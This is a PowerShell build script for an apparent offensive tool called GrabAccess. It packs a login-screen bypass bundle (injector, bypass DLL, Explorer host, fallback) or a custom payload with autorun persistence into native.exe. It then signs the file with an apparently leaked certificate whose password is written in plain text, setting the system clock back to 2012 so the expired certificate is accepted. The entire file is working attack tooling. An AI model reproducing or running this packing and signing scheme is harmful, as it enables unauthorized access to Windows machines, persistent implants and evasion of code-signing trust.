param(
    [switch]$NoUac,
    [switch]$SkipSign,
    [switch]$NoPause
)

$ErrorActionPreference = "Stop"
Set-StrictMode -Version 2.0

$Banner = @'
                                       ::===*****=.
                                     =#**========*#=
                                    =#=====******==##
                                    :##********=##=:##.
                                     *#=********###*:*#.
                                     *#####*****#####=*#.
                                     .##=========*####**#                        .:===**
                                       *#*==*****==####=#:                      ****===:
        .:=====***=====:..              :##*========*###*               .:====**#=::::==
      =*****=======************====:.     =##******####=           .::=****====:#*=*****
    =#*==::::::::::::::::=====******#=      :==*=*#==#=  .::===******##=::===***##**====
   *#=::=========:::::::::::::::::::*#*=========:=##==#*****#####****#*=*******==#***###
  =#**##############*******=========:*##############=::*##******===:::*#*********###**==
   .:##=**=========****#################===========##::###=              ......   =####*
     ####****########*##==*#********==:            #****#*#***=:                    ::.
      :*###################:                      .#=:::#*==#****=.
         ::::::::::::==:=:                        .#=::=##**##***##*.
                                                  .#=::=#*==##=***###=
                                                  .#=::=##**###**==##=
                                        =**#=      #*::=####*==*##*##
                                        ##=*#=     #*::=#=.=*#***##*:
                                  :===*####=##     #*::=#*   .:::.
                                :##===##:.=**==:.  #*::=#*
                               *###**##= :########=#*:::#*
                               ..:#####::###########*:::#*
                                 =#####:=###########*:::#*
                                 *#####= =##########*:::###=
                                 =#######=*#########*:=*#####=
     ..::::::::::=====:           =###########################
   :*##***************#.            =*#######################.
  :#*###=============*#               .=*#####################
   :*#################*                   .::=#######==:#######
     :=******###***##.                        :######:::########.
             =#=***=*#.                        =#####:::########*
            :##*#**###.                         *####::*#########:
             =###*=##=                       :*######=###########*
              *##*#*#*                    :*#####################:
      =*******#******#********************######################************************
     =#=========****======================::::::::*#########*::::======:::::::::::::::::
     :#********************************************##########***************************
      .====================================*##################====::::::::::::::::::::==

                                  -= GrabAccess =-
'@

function Show-Banner {
    Write-Host $Banner
}

function Show-Usage {
    Write-Host "Usage: build.ps1 [options]"
    Write-Host ""
    Write-Host "Options:"
    Write-Host "  -SkipSign, --skip-sign   Package native.exe without signing."
    Write-Host "  -NoPause,  --no-pause    Do not pause before exit."
    Write-Host "  -NoUac,    --no-uac      Do not self-elevate for signing."
}

foreach ($arg in $args) {
    switch -Regex ($arg) {
        "^(--skip-sign)$" {
            $SkipSign = $true
            continue
        }
        "^(--no-pause)$" {
            $NoPause = $true
            continue
        }
        "^(--no-uac)$" {
            $NoUac = $true
            continue
        }
        "^(--help|-h|/\\?)$" {
            Show-Usage
            exit 0
        }
        default {
            throw "[ERROR] Unknown option: $arg"
        }
    }
}

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -LiteralPath $ScriptDir

$BaseExe = "bin\nativex64.exe"
$InjectorExe = "bin\Injector.exe"
$Stage3Dll = "bin\GrabAccessMsvpBypass.dll"
$ExplorerHostExe = "bin\GrabAccessExplorerHost.exe"
$FallbackExe = "bin\GrabAccessFallback.exe"
$PayloadExe = "payload.exe"
$OutputExe = "native.exe"
$SignTool = "bin\signtool.exe"
$SigningDate = [datetime]"2012-12-12"

$PackageMagic = [UInt64]0x21314B4341504147 # "GAPACK1!" on disk
$PackageVersion = [UInt32]1
$MaxPayloads = 4
$FooterSize = [UInt32]56

function Test-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Assert-File {
    param([Parameter(Mandatory = $true)][string]$Path)

    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) {
        throw "[ERROR] Required file is missing: $Path"
    }
}

function Invoke-SelfElevated {
    $psArgs = @(
        "-NoProfile",
        "-ExecutionPolicy",
        "Bypass",
        "-File",
        "`"$PSCommandPath`"",
        "-NoUac"
    )

    if ($SkipSign) {
        $psArgs += "-SkipSign"
    }
    if ($NoPause) {
        $psArgs += "-NoPause"
    }

    Write-Host "[*] Requesting administrator rights for signing..."
    Start-Process -FilePath "powershell.exe" -ArgumentList ($psArgs -join " ") -Verb RunAs
}

function Wait-IfNeeded {
    if (-not $NoPause) {
        [void](Read-Host "Press Enter to continue")
    }
}

function Resolve-NativePath {
    param([Parameter(Mandatory = $true)][string]$Path)

    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

function Write-U32 {
    param(
        [Parameter(Mandatory = $true)][System.IO.Stream]$Stream,
        [Parameter(Mandatory = $true)][UInt32]$Value
    )

    $bytes = [BitConverter]::GetBytes($Value)
    $Stream.Write($bytes, 0, $bytes.Length)
}

function Write-U64 {
    param(
        [Parameter(Mandatory = $true)][System.IO.Stream]$Stream,
        [Parameter(Mandatory = $true)][UInt64]$Value
    )

    $bytes = [BitConverter]::GetBytes($Value)
    $Stream.Write($bytes, 0, $bytes.Length)
}

function Assert-U32 {
    param(
        [Parameter(Mandatory = $true)][Int64]$Value,
        [Parameter(Mandatory = $true)][string]$Name
    )

    if ($Value -lt 0 -or $Value -gt [UInt32]::MaxValue) {
        throw "$Name does not fit in UInt32: $Value"
    }

    return [UInt32]$Value
}

function Copy-FileToStream {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [Parameter(Mandatory = $true)][System.IO.Stream]$OutputStream
    )

    $inputPath = Resolve-NativePath $Path
    $inputStream = $null
    try {
        $inputStream = [System.IO.File]::Open($inputPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read)
        $inputStream.CopyTo($OutputStream)
    } finally {
        if ($inputStream) {
            $inputStream.Close()
        }
    }
}

function Write-GaPackage {
    param(
        [Parameter(Mandatory = $true)][string]$BaseExe,
        [Parameter(Mandatory = $true)][string]$OutputExe,
        [Parameter(Mandatory = $true)][string[]]$Payloads
    )

    if ($Payloads.Count -lt 1 -or $Payloads.Count -gt $MaxPayloads) {
        throw "Payload count must be between 1 and $MaxPayloads."
    }

    Assert-File $BaseExe
    foreach ($payload in $Payloads) {
        Assert-File $payload
    }

    $offsets = New-Object UInt32[] $MaxPayloads
    $sizes = New-Object UInt32[] $MaxPayloads
    $outputPath = Resolve-NativePath $OutputExe
    $outStream = $null

    try {
        $outStream = [System.IO.File]::Open($outputPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)

        Copy-FileToStream $BaseExe $outStream

        for ($i = 0; $i -lt $Payloads.Count; $i++) {
            $offsets[$i] = Assert-U32 $outStream.Position "Payload offset"

            $payloadPath = Resolve-NativePath $Payloads[$i]
            $payloadStream = $null
            try {
                $payloadStream = [System.IO.File]::Open($payloadPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read)
                $sizes[$i] = Assert-U32 $payloadStream.Length "Payload size"
                $payloadStream.CopyTo($outStream)
            } finally {
                if ($payloadStream) {
                    $payloadStream.Close()
                }
            }
        }

        [void](Assert-U32 ($outStream.Position + $FooterSize) "Output size")

        Write-U64 $outStream $PackageMagic
        Write-U32 $outStream $PackageVersion
        Write-U32 $outStream $FooterSize
        Write-U32 $outStream ([UInt32]$Payloads.Count)
        Write-U32 $outStream ([UInt32]0)

        for ($i = 0; $i -lt $MaxPayloads; $i++) {
            Write-U32 $outStream $offsets[$i]
        }

        for ($i = 0; $i -lt $MaxPayloads; $i++) {
            Write-U32 $outStream $sizes[$i]
        }
    } finally {
        if ($outStream) {
            $outStream.Close()
        }
    }
}

function Invoke-WithTemporarySystemDate {
    param(
        [Parameter(Mandatory = $true)][datetime]$Date,
        [Parameter(Mandatory = $true)][scriptblock]$Action
    )

    $originalDate = (Get-Date).Date
    $changed = $false

    try {
        $currentTime = Get-Date
        Set-Date -Date ($Date.Date + $currentTime.TimeOfDay) | Out-Null
        $changed = $true
        & $Action
    } finally {
        if ($changed) {
            try {
                $currentTime = Get-Date
                Set-Date -Date ($originalDate + $currentTime.TimeOfDay) | Out-Null
            } catch {
                Write-Warning "Unable to restore system date: $($_.Exception.Message)"
            }
        }
    }
}

function Invoke-SignExecutable {
    param([Parameter(Mandatory = $true)][string]$Path)

    Invoke-WithTemporarySystemDate -Date $SigningDate -Action {
        & $SignTool sign /v /ac "bin\VeriSignG5.cer" /f "bin\HT_Srl.pfx" /p "GeoMornellaChallenge7" /fd sha1 /nph $Path | Out-Null
        if ($LASTEXITCODE -ne 0) {
            throw "[ERROR] Signing failed. signtool.exe returned: $LASTEXITCODE"
        }
    }
}

try {
    if (-not $SkipSign -and -not (Test-Admin)) {
        if ($NoUac) {
            throw "[ERROR] Administrator rights are required for signing."
        }

        Invoke-SelfElevated
        exit 0
    }

    Write-Host "========================================================="
    Show-Banner
    Write-Host ""
    Write-Host "========================================================="
    Write-Host "GrabAccess Release packer"
    Write-Host "========================================================="
    Write-Host ""

    Write-Host "[*] Checking required files..."
    Assert-File $BaseExe

    if (Test-Path -LiteralPath $PayloadExe -PathType Leaf) {
        $payloads = @($PayloadExe)
        $mode = "payload autorun"
        $layout = "base + payload + footer"
        $packageType = "CUSTOM_PAYLOAD"
        $packageDetail = "payload.exe was found; native.exe will deploy it and register autorun."
    } else {
        Assert-File $InjectorExe
        Assert-File $Stage3Dll
        Assert-File $ExplorerHostExe
        Assert-File $FallbackExe
        $payloads = @($InjectorExe, $Stage3Dll, $ExplorerHostExe, $FallbackExe)
        $mode = "LogonUI helper"
        $layout = "base + injector + stage3 dll + explorer host + fallback + footer"
        $packageType = "DEFAULT_BYPASS_TOOL"
        $packageDetail = "payload.exe was not found; native.exe bundles Injector.exe, GrabAccessMsvpBypass.dll, GrabAccessExplorerHost.exe, and GrabAccessFallback.exe."
    }

    if (-not $SkipSign) {
        Assert-File $SignTool
    }

    Write-Host "[OK] File check passed."
    Write-Host ""

    Write-Host "[*] Packing payloads..."
    Write-Host "    mode: $mode"
    Write-Host "    layout: $layout"

    if (Test-Path -LiteralPath $OutputExe -PathType Leaf) {
        Remove-Item -LiteralPath $OutputExe -Force
    }

    Write-GaPackage -BaseExe $BaseExe -OutputExe $OutputExe -Payloads $payloads
    if (-not (Test-Path -LiteralPath $OutputExe -PathType Leaf)) {
        throw "[ERROR] Failed to pack files."
    }

    Write-Host "[OK] Packed: $OutputExe"

    if ($SkipSign) {
        Write-Host "[*] Signing skipped."
    } else {
        Write-Host ""
        Write-Host "[*] Signing $OutputExe..."
        Invoke-SignExecutable -Path $OutputExe
        Write-Host "[OK] Signed successfully."
    }

    Write-Host ""
    Write-Host "========================================================="
    Write-Host "[OK] Release package ready."
    Write-Host "Package type: $packageType"
    Write-Host "Detail: $packageDetail"
    Write-Host "Output: $OutputExe"
    Write-Host "========================================================="
    Wait-IfNeeded
    exit 0
} catch {
    Write-Host ""
    Write-Host "========================================================="
    Write-Host "[FAILED] Release packaging aborted."
    Write-Host "========================================================="
    Write-Host $_.Exception.Message
    Wait-IfNeeded
    exit 1
}
